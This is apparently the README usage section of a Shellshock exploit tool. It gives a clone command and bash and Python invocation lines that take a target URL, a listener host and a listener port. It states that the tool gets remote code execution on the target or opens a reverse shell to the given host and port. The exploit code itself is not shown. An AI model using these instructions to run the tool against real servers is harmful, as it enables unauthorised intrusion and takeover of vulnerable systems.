
## How to use

#### Clone the repository (or just copy-paste the one you prefer)
```bash
  sudo git clone https://github.com/Gurguii/shellshock.sh
```  

#### Run the script
- Bash
```bash
    bash shellshock.sh -u <url> -h* <lhost> -p* <lport>
```
- Python
```bash
    python3 shellshock.py -u <url> -lh* <lhost> -lp* <lport>
```  
Note: default LPORT is 4444, URL required. If just URL given, it will RCE, else it will RSHELL to given lhost and lport
